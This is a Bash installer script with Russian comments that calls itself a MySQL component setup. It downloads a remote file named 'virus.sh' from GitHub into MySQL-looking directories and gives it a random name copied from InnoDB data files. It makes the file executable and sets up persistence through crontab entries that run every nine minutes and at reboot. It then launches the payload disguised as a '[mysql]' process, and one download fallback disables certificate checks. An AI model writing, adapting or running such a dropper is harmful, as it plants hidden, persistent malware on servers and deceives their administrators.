# Исправленный URL для скачивания RAW файла
GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

print_error() {
    echo -e "${RED}[✗] $1${NC}"
}

print_info() {
    echo -e "${YELLOW}[i] $1${NC}"
}

print_debug() {
    echo -e "${BLUE}[DEBUG] $1${NC}"
}

check_network() {
    print_info "Проверка сетевого подключения..."
    
    # Проверка DNS
    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
        print_success "DNS работает"
    else
        print_error "Проблемы с DNS"
    fi
    
    # Проверка доступности GitHub
    if ping -c 1 github.com >/dev/null 2>&1; then
        print_success "GitHub доступен"
    else
        print_error "GitHub недоступен (ping)"
    fi
    
    # Проверка через curl
    if curl -s --head https://github.com >/dev/null 2>&1; then
        print_success "GitHub отвечает на запросы"
    else
        print_error "GitHub не отвечает на запросы"
    fi
}

download_script() {
    local url="$1"
    local output="$2"
    
    print_info "Попытка загрузки с URL: $url"
    
    # Проверка различных вариантов URL
    if [[ ! "$url" =~ raw\.githubusercontent\.com ]]; then
        print_info "URL не является raw-ссылкой, пробуем преобразовать..."
        
        # Преобразуем URL из blob в raw
        if [[ "$url" =~ github\.com/([^/]+)/([^/]+)/blob/(.+) ]]; then
            local user="${BASH_REMATCH[1]}"
            local repo="${BASH_REMATCH[2]}"
            local path="${BASH_REMATCH[3]}"
            local raw_url="https://raw.githubusercontent.com/$user/$repo/$path"
            print_info "Преобразованный URL: $raw_url"
            url="$raw_url"
        fi
    fi
    
    # Попытка загрузки с разными опциями curl
    print_info "Попытка загрузки файла..."
    
    # Вариант 1: Стандартная загрузка
    if curl -L -s --fail "$url" -o "$output" 2>/dev/null; then
        print_success "Файл успешно загружен (метод 1)"
        return 0
    else
        print_error "Не удалось загрузить методом 1"
    fi
    
    # Вариант 2: С дополнительными заголовками
    if curl -L -s --fail -H "User-Agent: Mozilla/5.0" "$url" -o "$output" 2>/dev/null; then
        print_success "Файл успешно загружен (метод 2)"
        return 0
    else
        print_error "Не удалось загрузить методом 2"
    fi
    
    # Вариант 3: Без проверки сертификата
    if curl -L -s --fail -k "$url" -o "$output" 2>/dev/null; then
        print_success "Файл успешно загружен (метод 3)"
        return 0
    else
        print_error "Не удалось загрузить методом 3"
    fi
    
    # Вариант 4: Через wget, если есть
    if command -v wget >/dev/null 2>&1; then
        print_info "Пробуем wget..."
        if wget -q --no-check-certificate "$url" -O "$output" 2>/dev/null; then
            print_success "Файл успешно загружен через wget"
            return 0
        else
            print_error "Не удалось загрузить через wget"
        fi
    fi
    
    return 1
}

verify_download() {
    local file="$1"
    
    if [ ! -f "$file" ]; then
        print_error "Файл не существует: $file"
        return 1
    fi
    
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
    print_info "Размер файла: $size байт"
    
    if [ "$size" -eq 0 ]; then
        print_error "Файл пустой"
        return 1
    fi
    
    # Проверка, что это не HTML страница с ошибкой
    if head -n 1 "$file" | grep -q "<!DOCTYPE html>\|<html>\|404: Not Found"; then
        print_error "Скачана HTML страница, а не скрипт (возможно, ошибка 404)"
        return 1
    fi
    
    # Проверка, что файл начинается с shebang
    if head -n 1 "$file" | grep -q "^#!"; then
        print_success "Файл содержит shebang, похоже на исполняемый скрипт"
    else
        print_info "Файл не содержит shebang, но может быть бинарным"
    fi
    
    print_success "Проверка файла пройдена"
    return 0
}

generate_name() {
    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
    RANDOM_PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
    RANDOM_NUMBER=$((RANDOM % 10000))
    GENERATED_NAME="${RANDOM_PREFIX}${RANDOM_NUMBER}"
    print_success "Сгенерировано имя: $GENERATED_NAME"
    echo "$GENERATED_NAME"
}

find_dir() {
    print_info "Поиск доступной директории MySQL..."
    
    for dir in "${MYSQL_DIRS[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            if [ -w "$dir" ]; then
                print_success "Найдена доступная директория: $dir"
                echo "$dir"
                return 0
            else
                print_error "Нет прав на запись в директорию: $dir"
            fi
        else
            print_error "Не удалось создать директорию: $dir"
        fi
    done
    
    print_info "Используем директорию по умолчанию: /tmp/mysql"
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

process() {
    print_info "Запуск процесса с маскировкой под [mysql]..."
    
    if [ ! -f "$SCRIPT_PATH" ]; then
        print_error "Скрипт не найден: $SCRIPT_PATH"
        return 1
    fi
    
    if [ ! -x "$SCRIPT_PATH" ]; then
        print_error "Скрипт не имеет прав на выполнение"
        chmod +x "$SCRIPT_PATH" && print_success "Права исправлены"
    fi
    
    # Проверка синтаксиса скрипта
    if bash -n "$SCRIPT_PATH" 2>/dev/null; then
        print_success "Синтаксис скрипта корректен"
    else
        print_error "Ошибка в синтаксисе скрипта"
        bash -n "$SCRIPT_PATH" 2>&1 | head -n 5
    fi
    
    if exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null & then
        PROCESS_PID=$!
        sleep 1
        if kill -0 $PROCESS_PID 2>/dev/null; then
            print_success "Процесс успешно запущен с PID: $PROCESS_PID"
            ps aux | grep -E "\[mysql\]|$PROCESS_PID" | grep -v grep
        else
            print_error "Процесс запущен, но не отвечает"
        fi
    else
        print_error "Не удалось запустить процесс"
        # Попытка запуска без маскировки для диагностики
        print_info "Пробуем запустить без маскировки..."
        if "$SCRIPT_PATH" & then
            print_success "Процесс запущен без маскировки"
        else
            print_error "Процесс не запускается даже без маскировки"
        fi
    fi
}

main() {
    echo "==================================="
    echo "    Установка MySQL компонентов    "
    echo "==================================="
    
    # Проверка наличия необходимых утилит
    print_info "Проверка зависимостей..."
    for cmd in curl bash; do
        if command -v $cmd >/dev/null 2>&1; then
            print_success "Найдено: $cmd"
        else
            print_error "Не найдено: $cmd"
        fi
    done
    
    check_network
    
    MYSQL_DIR=$(find_dir)
    RANDOM_NAME=$(generate_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
    
    print_info "Путь к скрипту: $SCRIPT_PATH"
    
    # Проверка наличия в crontab
    print_info "Проверка наличия задачи в crontab..."
    if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        print_success "Задача уже существует в crontab"
    else
        if download_script "$GITHUB_SCRIPT_URL" "$SCRIPT_PATH"; then
            if verify_download "$SCRIPT_PATH"; then
                print_success "Скрипт успешно загружен и проверен"
                
                chmod +x "$SCRIPT_PATH"
                if [ -x "$SCRIPT_PATH" ]; then
                    print_success "Права на выполнение установлены"
                else
                    print_error "Не удалось установить права на выполнение"
                fi
                
                # Добавление в crontab
                print_info "Добавление задач в crontab..."
                (crontab -l 2>/dev/null
                echo "*/9 * * * * $SCRIPT_PATH >/dev/null 2>&1"
                echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
                ) | crontab -
                
                if [ $? -eq 0 ]; then
                    print_success "Задачи успешно добавлены в crontab"
                    crontab -l | grep -A 2 "$SCRIPT_PATH"
                else
                    print_error "Не удалось добавить задачи в crontab"
                fi
            else
                print_error "Проверка файла не пройдена"
                rm -f "$SCRIPT_PATH"
            fi
        else
            print_error "Не удалось загрузить скрипт с GitHub"
            print_info "Возможные причины:"
            echo "  1. Неправильный URL (используйте raw ссылку)"
            echo "  2. Проблемы с сетью или брандмауэром"
            echo "  3. Репозиторий или файл не существует"
            echo "  4. Требуется аутентификация"
            echo ""
            echo "   Правильная ссылка: https://raw.githubusercontent.com/Zend1X/virus/main/virus.sh"
        fi
    fi
    
    if [ -f "$SCRIPT_PATH" ]; then
        process
    fi
    
    print_success "Установка завершена"
    echo "==================================="
}

# Запуск основной функции с обработкой ошибок
if main; then
    print_success "Скрипт выполнен успешно"
else
    print_error "Ошибка выполнения скрипта"
    exit 1
fi
